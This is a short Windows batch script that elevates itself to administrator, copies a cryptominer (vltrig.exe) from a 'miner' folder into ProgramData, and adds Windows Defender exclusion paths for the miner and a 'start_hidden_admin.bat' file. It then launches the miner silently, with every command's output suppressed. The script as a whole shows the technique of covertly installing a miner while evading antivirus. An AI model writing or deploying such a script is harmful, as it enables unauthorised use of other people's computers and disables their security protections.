@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

set "TARGET=C:\ProgramData\VLTrig"
if not exist "%TARGET%" (
    md "%TARGET%" >nul 2>&1
)
xcopy /Y /I "D:\miner\*" "%TARGET%\*" >nul 2>&1

powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%\vltrig.exe' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET%\start_hidden_admin.bat' -ErrorAction SilentlyContinue" >nul 2>&1

start "" /b "%TARGET%\vltrig.exe" --config="%TARGET%\config.json" >nul 2>&1
exit